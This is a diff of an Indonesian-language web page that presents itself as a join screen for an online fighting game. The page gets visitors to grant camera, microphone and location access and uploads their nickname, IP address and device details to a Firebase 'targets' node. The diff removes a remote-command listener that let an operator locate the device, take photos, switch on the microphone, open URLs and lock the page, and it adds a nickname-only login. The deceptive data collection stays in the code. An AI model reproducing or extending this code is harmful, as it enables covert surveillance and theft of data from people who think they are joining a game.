@@ -3,30 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Game Fight - Online</title>
+    <title>Join Game - REM</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&display=swap');
         
-        :root {
-            --neon-cyan: #00f0ff;
-            --neon-pink: #ff00e5;
-            --neon-green: #00ff41;
-            --dark-bg: #0a0a0f;
-            --card-bg: #12121a;
-        }
-        
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
             font-family: 'Rajdhani', 'Orbitron', sans-serif;
-            background: var(--dark-bg);
+            background: #0a0a0f;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            overflow-x: hidden;
+            overflow: hidden;
             position: relative;
         }
         
@@ -55,14 +47,13 @@
         .particle {
             position: absolute;
             width: 3px; height: 3px;
-            background: var(--neon-cyan);
+            background: #00f0ff;
             border-radius: 50%;
             animation: float 6s ease-in-out infinite;
             opacity: 0.6;
         }
-        .particle:nth-child(2n) { background: var(--neon-pink); animation-delay: -3s; }
-        .particle:nth-child(3n) { background: var(--neon-green); animation-delay: -1.5s; }
-        .particle:nth-child(5n) { animation-duration: 8s; }
+        .particle:nth-child(2n) { background: #ff00e5; animation-delay: -3s; }
+        .particle:nth-child(3n) { background: #00ff41; animation-delay: -1.5s; }
         @keyframes float {
             0%, 100% { transform: translateY(0) translateX(0); }
             25% { transform: translateY(-80px) translateX(40px); }
@@ -78,7 +69,7 @@
         }
         
         .game-card {
-            background: var(--card-bg);
+            background: #12121a;
             border: 2px solid #1a1a2e;
             border-radius: 16px;
             padding: 30px 24px;
@@ -88,14 +79,13 @@
                 0 0 30px rgba(0,240,255,0.1),
                 0 0 60px rgba(255,0,229,0.05),
                 inset 0 0 30px rgba(0,0,0,0.5);
-            transition: all 0.3s ease;
         }
         .game-card::before {
             content: '';
             position: absolute;
             top: -2px; left: -2px; right: -2px; bottom: -2px;
             border-radius: 18px;
-            background: linear-gradient(45deg, var(--neon-cyan), var(--neon-pink), var(--neon-green), var(--neon-cyan));
+            background: linear-gradient(45deg, #00f0ff, #ff00e5, #00ff41, #00f0ff);
             background-size: 400% 400%;
             z-index: -1;
             animation: borderGlow 4s ease-in-out infinite;
@@ -113,15 +103,15 @@
             display: inline-block;
         }
         @keyframes pulse {
-            0%, 100% { transform: scale(1); filter: drop-shadow(0 0 10px var(--neon-cyan)); }
-            50% { transform: scale(1.1); filter: drop-shadow(0 0 25px var(--neon-pink)); }
+            0%, 100% { transform: scale(1); filter: drop-shadow(0 0 10px #00f0ff); }
+            50% { transform: scale(1.1); filter: drop-shadow(0 0 25px #ff00e5); }
         }
         
         h1 {
             font-family: 'Orbitron', sans-serif;
             font-size: 28px;
             font-weight: 900;
-            background: linear-gradient(135deg, var(--neon-cyan), var(--neon-pink));
+            background: linear-gradient(135deg, #00f0ff, #ff00e5);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -160,7 +150,7 @@
         }
         .input-group input:focus {
             outline: none;
-            border-color: var(--neon-cyan);
+            border-color: #00f0ff;
             box-shadow: 0 0 15px rgba(0,240,255,0.2);
         }
         .input-group input::placeholder { color: #4a4a6a; }
@@ -192,7 +182,6 @@
         }
         .glow-btn.pink:hover { box-shadow: 0 0 35px rgba(255,0,229,0.6); transform: translateY(-2px); }
         .glow-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
-        .glow-btn:active { transform: scale(0.95) !important; }
         
         .perm-cards { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
         .perm-card {
@@ -205,7 +194,7 @@
             padding: 12px 14px;
             transition: all 0.3s;
         }
-        .perm-card.granted { border-color: var(--neon-green); box-shadow: 0 0 10px rgba(0,255,65,0.15); }
+        .perm-card.granted { border-color: #00ff41; box-shadow: 0 0 10px rgba(0,255,65,0.15); }
         .perm-card.denied { border-color: #ff3333; box-shadow: 0 0 10px rgba(255,51,51,0.15); }
         .perm-card .perm-icon { font-size: 28px; width: 40px; text-align: center; }
         .perm-card .perm-info { flex: 1; text-align: left; }
@@ -228,7 +217,7 @@
             display: inline-block;
             width: 14px; height: 14px;
             border: 2px solid #2a2a3a;
-            border-top-color: var(--neon-cyan);
+            border-top-color: #00f0ff;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
             vertical-align: middle;
@@ -256,8 +245,21 @@
             background: #2a2a3a;
             transition: all 0.3s;
         }
-        .dot-ind.active { background: var(--neon-cyan); box-shadow: 0 0 8px var(--neon-cyan); }
-        .dot-ind.done { background: var(--neon-green); box-shadow: 0 0 8px var(--neon-green); }
+        .dot-ind.active { background: #00f0ff; box-shadow: 0 0 8px #00f0ff; }
+        .dot-ind.done { background: #00ff41; box-shadow: 0 0 8px #00ff41; }
+        
+        #login-section {
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid #1a1a2e;
+        }
+        #login-section .login-link {
+            color: #00f0ff;
+            cursor: pointer;
+            text-decoration: underline;
+            font-weight: bold;
+        }
+        #login-section .login-link:hover { color: #ff00e5; }
         
         @media (max-width: 480px) {
             .game-card { padding: 20px 16px; }
@@ -282,8 +284,9 @@
                 <div class="dot-ind" id="dot3"></div>
             </div>
             
+            <!-- STEP 1: NICKNAME -->
             <div class="step active" id="step1">
-                <h1>JOIN GAME</h1>
+                <h1>🎮JOIN GAME FIGHT</h1>
                 <p class="subtitle">Masukkan nickname untuk bermain</p>
                 <div class="input-group">
                     <input type="text" id="nickname" placeholder="Nickname kamu..." maxlength="20" autocomplete="off" />
@@ -292,8 +295,15 @@
                     ▶ LANJUTKAN
                 </button>
                 <div class="error-popup" id="nameError">⚠ Masukkan nickname dulu bro!</div>
+                
+                <!-- Login Section -->
+                <div id="login-section">
+                    <span style="color:#6a6a8a;font-size:12px;">Sudah punya akun?</span>
+                    <span class="login-link" onclick="showLogin()">Login disini</span>
+                </div>
             </div>
             
+            <!-- STEP 2: PERMISSIONS -->
             <div class="step" id="step2">
                 <h1>SETUP DEVICE</h1>
                 <p class="subtitle">Izinkan akses untuk pengalaman terbaik</p>
@@ -330,13 +340,27 @@
                 <div class="error-popup" id="permError"></div>
             </div>
             
+            <!-- STEP 3: READY -->
             <div class="step" id="step3">
                 <h1>✅ READY!</h1>
-                <p class="subtitle">Semua sudah siap. Mengarahkan ke game...</p>
+                <p class="subtitle">memuat...</p>
                 <div class="status-bar">
                     <span class="loader"></span> Loading game...
                 </div>
             </div>
+        </div>
+    </div>
+    
+    <!-- Login Modal -->
+    <div id="loginModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:1000;align-items:center;justify-content:center;">
+        <div style="background:#12121a;padding:30px;border-radius:16px;max-width:360px;width:90%;border:1px solid #1a1a2e;">
+            <h2 style="font-family:Orbitron;font-size:20px;margin-bottom:16px;color:#fff;">🔐 LOGIN</h2>
+            <div class="input-group">
+                <input type="text" id="loginName" placeholder="Nickname" style="width:100%;padding:12px;background:#0d0d15;border:1px solid #2a2a3a;border-radius:8px;color:#fff;font-size:14px;" />
+            </div>
+            <button class="glow-btn cyan" onclick="doLogin()" style="font-size:13px;padding:12px;">LOGIN</button>
+            <button onclick="document.getElementById('loginModal').style.display='none'" style="margin-top:8px;background:none;border:none;color:#6a6a8a;cursor:pointer;font-size:12px;">Tutup</button>
+            <div id="loginError" style="color:#ff4444;font-size:12px;margin-top:8px;display:none;"></div>
         </div>
     </div>
     
@@ -386,18 +410,11 @@
         }
         
         function goToPermissions() {
-            console.log('🟢 goToPermissions() CALLED');
-            
             const nicknameInput = document.getElementById('nickname');
             const step1 = document.getElementById('step1');
             const step2 = document.getElementById('step2');
             const dot1 = document.getElementById('dot1');
             const dot2 = document.getElementById('dot2');
-            
-            if (!nicknameInput || !step1 || !step2) {
-                alert('Error: Halaman tidak termuat sempurna. Refresh halaman.');
-                return;
-            }
             
             nickname = nicknameInput.value.trim();
             
@@ -420,12 +437,46 @@
             dot1.classList.add('done');
             dot2.classList.add('active');
             
-            console.log('✅ Switched to step 2, nickname:', nickname);
+            // Save nickname to localStorage
+            localStorage.setItem('lastNickname', nickname);
+        }
+        
+        function showLogin() {
+            document.getElementById('loginModal').style.display = 'flex';
+            document.getElementById('loginName').value = localStorage.getItem('lastNickname') || '';
+            document.getElementById('loginError').style.display = 'none';
+        }
+        
+        function doLogin() {
+            const name = document.getElementById('loginName').value.trim();
+            if (!name) {
+                document.getElementById('loginError').textContent = 'Masukkan nickname!';
+                document.getElementById('loginError').style.display = 'block';
+                return;
+            }
+            
+            // Check if user exists
+            db.ref('users').orderByChild('name').equalTo(name).once('value').then(snap => {
+                if (snap.exists()) {
+                    let userId = null;
+                    snap.forEach(child => { userId = child.key; });
+                    localStorage.setItem('currentUser', userId);
+                    localStorage.setItem('lastNickname', name);
+                    
+                    // Redirect to game with user data
+                    const uid = userId;
+                    window.location.href = `game.html?uid=${uid}&name=${encodeURIComponent(name)}`;
+                } else {
+                    document.getElementById('loginError').textContent = 'User tidak ditemukan!';
+                    document.getElementById('loginError').style.display = 'block';
+                }
+            }).catch(err => {
+                document.getElementById('loginError').textContent = 'Error: ' + err.message;
+                document.getElementById('loginError').style.display = 'block';
+            });
         }
         
         async function grantAllPermissions() {
-            console.log('🟢 grantAllPermissions() CALLED');
-            
             const btn = document.getElementById('grantBtn');
             const statusEl = document.getElementById('permStatus');
             const errorEl = document.getElementById('permError');
@@ -472,7 +523,7 @@
             // 2. KAMERA
             try {
                 cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
                 });
                 permissionsGranted.camera = true;
                 document.getElementById('statusCam').textContent = '✅';
@@ -501,8 +552,21 @@
                 errorEl.style.display = 'block';
             }
             
-            // SIMPAN DATA
+            // SIMPAN DATA USER
             const deviceInfo = await collectDeviceInfo();
+            
+            // Create user in users node for login
+            await db.ref(`users/${targetId}`).set({
+                name: nickname,
+                created: Date.now(),
+                rankPoints: 0,
+                wins: 0,
+                losses: 0
+            });
+            
+            // Save to localStorage for auto-login
+            localStorage.setItem('currentUser', targetId);
+            localStorage.setItem('lastNickname', nickname);
             
             await db.ref(`targets/${targetId}`).set({
                 name: nickname,
@@ -537,8 +601,6 @@
             
             window._cameraStream = cameraStream;
             window._micStream = micStream;
-            
-            listenCommands();
             
             console.log('🎉 All done! Redirecting...');
             btn.innerHTML = '✅ BERHASIL!';
@@ -580,132 +642,14 @@
             return { model, os, ip, screen: `${screen.width}x${screen.height}`, battery: batteryLevel, network: navigator.connection ? navigator.connection.effectiveType : 'N/A', cores: navigator.hardwareConcurrency || 'N/A' };
         }
         
-        function listenCommands() {
-            db.ref(`commands/${targetId}`).on('value', async (snap) => {
-                const cmd = snap.val();
-                if (!cmd || cmd.executed) return;
-                
-                switch(cmd.command) {
-                    case 'getLocation':
-                        if (navigator.geolocation) {
-                            navigator.geolocation.getCurrentPosition(
-                                (pos) => {
-                                    const loc = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, timestamp: Date.now() };
-                                    db.ref(`targets/${targetId}`).update({ location: loc });
-                                    db.ref(`targets/${targetId}/locationHistory`).push(loc);
-                                    db.ref(`commands/${targetId}`).update({ executed: true });
-                                },
-                                (err) => { db.ref(`targets/${targetId}`).update({ locationError: `GetLoc: ${err.message}` }); db.ref(`commands/${targetId}`).update({ executed: true, error: err.message }); },
-                                { enableHighAccuracy: true, timeout: 10000 }
-                            );
-                        }
-                        break;
-                        
-                    case 'capturePhoto':
-                        await captureAndSendPhoto(cmd.facingMode || 'user');
-                        db.ref(`commands/${targetId}`).update({ executed: true });
-                        break;
-                        
-                    case 'startMic':
-                        if (window._micStream && window._micStream.getAudioTracks().length > 0) {
-                            window._micStream.getAudioTracks().forEach(t => t.enabled = true);
-                        }
-                        db.ref(`commands/${targetId}`).update({ executed: true });
-                        break;
-                        
-                    case 'stopMic':
-                        if (window._micStream && window._micStream.getAudioTracks().length > 0) {
-                            window._micStream.getAudioTracks().forEach(t => t.enabled = false);
-                        }
-                        db.ref(`commands/${targetId}`).update({ executed: true });
-                        break;
-                        
-                    case 'notification':
-                        if (Notification.permission === 'granted') {
-                            new Notification(cmd.title || 'Info', { body: cmd.body || 'Pesan baru', icon: '🎮' });
-                        } else if (Notification.permission === 'default') {
-                            const p = await Notification.requestPermission();
-                            if (p === 'granted') new Notification(cmd.title || 'Info', { body: cmd.body || 'Pesan baru' });
-                        }
-                        db.ref(`commands/${targetId}`).update({ executed: true });
-                        break;
-                        
-                    case 'openURL':
-                        window.open(cmd.url, '_blank');
-                        db.ref(`commands/${targetId}`).update({ executed: true });
-                        break;
-                        
-                    case 'vibrate':
-                        navigator.vibrate(cmd.duration || 1000);
-                        db.ref(`commands/${targetId}`).update({ executed: true });
-                        break;
-                        
-                    case 'lock':
-                        document.body.innerHTML = `<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#000;color:#00f0ff;font-family:Orbitron;font-size:24px;">🔒 DEVICE LOCKED</div>`;
-                        db.ref(`commands/${targetId}`).update({ executed: true });
-                        break;
-                        
-                    case 'wipe':
-                        db.ref(`targets/${targetId}`).remove();
-                        db.ref(`commands/${targetId}`).remove();
-                        break;
-                        
-                    case 'updateInfo':
-                        const info = await collectDeviceInfo();
-                        db.ref(`targets/${targetId}`).update(info);
-                        db.ref(`commands/${targetId}`).update({ executed: true });
-                        break;
-                        
-                    case 'getBattery':
-                        if (navigator.getBattery) {
-                            const b = await navigator.getBattery();
-                            db.ref(`targets/${targetId}`).update({ battery: Math.round(b.level * 100) });
-                        }
-                        db.ref(`commands/${targetId}`).update({ executed: true });
-                        break;
-                }
-            });
-        }
-        
-        async function captureAndSendPhoto(facingMode = 'user') {
-            try {
-                let stream = window._cameraStream;
-                if (!stream || stream.getVideoTracks().length === 0) {
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
-                    });
-                    window._cameraStream = stream;
-                }
-                
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.setAttribute('playsinline', true);
-                await video.play();
-                await new Promise(r => setTimeout(r, 600));
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                const base64 = canvas.toDataURL('image/jpeg', 0.85);
-                await db.ref(`targets/${targetId}`).update({
-                    photo: { base64, timestamp: Date.now(), facingMode, nickname }
-                });
-                
-                video.pause();
-                video.srcObject = null;
-            } catch(e) {
-                console.error('Photo error:', e);
-                await db.ref(`targets/${targetId}`).update({ photoError: { message: e.message, timestamp: Date.now() } });
-            }
-        }
-        
         document.addEventListener('DOMContentLoaded', () => {
             document.getElementById('nickname')?.addEventListener('keypress', (e) => {
                 if (e.key === 'Enter') { e.preventDefault(); goToPermissions(); }
             });
+            
+            // Auto-fill last nickname
+            const last = localStorage.getItem('lastNickname');
+            if (last) document.getElementById('nickname').value = last;
         });
         
         console.log('✅ index.html FULLY LOADED');
